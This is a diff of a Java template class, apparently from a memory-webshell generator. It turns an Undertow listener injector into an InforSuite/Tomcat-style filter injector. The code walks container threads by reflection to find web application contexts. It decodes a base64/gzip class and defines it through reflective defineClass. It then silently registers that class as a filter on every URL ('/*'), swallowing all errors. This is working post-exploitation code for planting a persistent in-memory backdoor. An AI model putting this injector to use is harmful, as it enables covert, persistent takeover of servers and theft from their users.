@@ -1,17 +1,22 @@
 package jmg.core.template;
 
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 import java.util.zip.GZIPInputStream;
 
 
-public class UndertowListenerInjectorTpl {
+public class InforSuiteFilterInjectorTpl {
+
+    public String getUrlPattern() {
+        return "/*";
+    }
 
 
     public String getClassName() {
@@ -23,15 +28,15 @@ public class UndertowListenerInjectorTpl {
     }
 
     static {
-        new UndertowListenerInjectorTpl();
+        new InforSuiteFilterInjectorTpl();
     }
 
-    public UndertowListenerInjectorTpl() {
+    public InforSuiteFilterInjectorTpl() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                Object listener = getListener(context);
-                addListener(context, listener);
+                Object filter = getFilter(context);
+                addFilter(context, filter);
             }
         } catch (Exception ignored) {
 
@@ -40,73 +45,80 @@ public class UndertowListenerInjectorTpl {
     }
 
     public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
-        List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        for (int i = 0; i < threads.length; i++) {
-            try {
-                Object requestContext = invokeMethod(threads[i].getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
-                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
-                if (servletContext != null) contexts.add(servletContext);
-            } catch (Exception ignored) {
+        List<Object> contexts = new ArrayList();
+        Thread[] threads = getThreads();
+        try {
+            for (Thread thread : threads) {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+                    for (Object key : childrenMap.keySet()) {
+                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
+                        for (Object key1 : children.keySet()) {
+                            Object context = children.get(key1);
+                            if (context != null) contexts.add(context);
+                        }
+                    }
+                }
             }
+        } catch (Exception ignored) {
         }
         return contexts;
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+    public Thread[] getThreads(){
+        Thread[] var0 = null;
+
         try {
-            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
-        } catch (Exception e) {
-            Object deploymentInfo = getFV(context, "deploymentInfo");
-            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
+            var0 = (Thread[])(invokeMethod(Thread.class, "getThreads"));
+        } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException var3) {
+            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
+            var0 = new Thread[var2.activeCount()];
+            var2.enumerate(var0);
         }
+
+        return var0;
     }
 
-    private Object getListener(Object context) throws Exception {
-        Object listener = null;
-        ClassLoader classLoader = getWebAppClassLoader(context);
+    private Object getFilter(Object context) throws Exception {
+        ClassLoader classLoader = (ClassLoader) getFV(getFV(context, "loader"), "classLoader");
+        Object filter = null;
         try {
-            listener = classLoader.loadClass(getClassName()).newInstance();
+            filter = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
             try {
                 byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                 Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                 defineClass.setAccessible(true);
                 Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                listener = clazz.newInstance();
-            } catch (Throwable tt) {
+                filter = clazz.newInstance();
+            } catch (Exception ignored) {
             }
+
         }
-        return listener;
+        return filter;
     }
 
-    // 添加有效 io.undertow.servlet.core.ApplicationListeners.addListener
-    // 添加无效 io.undertow.servlet.api.DeploymentInfo.addListener
-    public void addListener(Object context, Object listener) {
+    public void addFilter(Object context, Object filter) {
+        String filterName = getSimpleName(getClassName());
         try {
-            if (isInjected(context, listener.getClass().getName())) {
-                return;
-            }
-            Class listenerInfoClass = Class.forName("io.undertow.servlet.api.ListenerInfo");
-            Object listenerInfo = listenerInfoClass.getConstructor(Class.class).newInstance(listener.getClass());
-            Object deploymentImpl = getFV(context, "deployment");
-            Object applicationListeners = getFV(deploymentImpl, "applicationListeners");
-            Class managedListenerClass = Class.forName("io.undertow.servlet.core.ManagedListener");
-            Object managedListener = managedListenerClass.getConstructor(listenerInfoClass, boolean.class).newInstance(listenerInfo, true);
-            invokeMethod(applicationListeners, "addListener", new Class[]{managedListenerClass}, new Object[]{managedListener});
-        } catch (Throwable e) {
+            Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
+            Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+            invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+            invokeMethod(filterDef, "setFilter", new Class[]{Class.forName("javax.servlet.Filter")}, new Object[]{filter});
+            invokeMethod(filterDef, "setFilterClassName", new Class[]{String.class}, new Object[]{null});
+            invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
+            invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
+            invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
+            invokeMethod(filterMap, "setURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
+            // org.apache.catalina.core.StandardContext.addFilterMap(org.apache.catalina.deploy.FilterMap, boolean)
+            invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass(), boolean.class}, new Object[]{filterMap, false});
+            Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
+            constructors[0].setAccessible(true);
+            Object filterConfig = constructors[0].newInstance(context, filterDef);
+            Map filterConfigs = (Map) getFV(context, "filterConfigs");
+            filterConfigs.put(filterName, filterConfig);
+        } catch (Exception ignored) {
         }
-    }
-
-    public boolean isInjected(Object context, String evilClassName) throws Exception {
-        List allListeners = (List) getFV(getFV(getFV(context, "deployment"), "applicationListeners"), "allListeners");
-        for (int i = 0; i < allListeners.size(); i++) {
-            Class listener = (Class) getFV(getFV(allListeners.get(i), "listenerInfo"), "listenerClass");
-            if (listener.getName().contains(evilClassName)) {
-                return true;
-            }
-        }
-        return false;
     }
 
 
@@ -122,6 +134,15 @@ public class UndertowListenerInjectorTpl {
         }
     }
 
+
+    public static String getSimpleName(String className) {
+        int lastDotIndex = className.lastIndexOf(".");
+        if (lastDotIndex != -1 && lastDotIndex < className.length() - 1) {
+            return className.substring(lastDotIndex + 1);
+        }
+        return className;
+    }
+
     public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
@@ -132,10 +153,6 @@ public class UndertowListenerInjectorTpl {
             out.write(buffer, 0, n);
         }
         return out.toByteArray();
-    }
-
-    synchronized void setFV(Object var0, String var1, Object val) throws Exception {
-        getF(var0, var1).set(var0, val);
     }
 
     static Object getFV(Object obj, String fieldName) throws Exception {
@@ -157,7 +174,6 @@ public class UndertowListenerInjectorTpl {
         }
         throw new NoSuchFieldException(fieldName);
     }
-
 
     static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
         return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
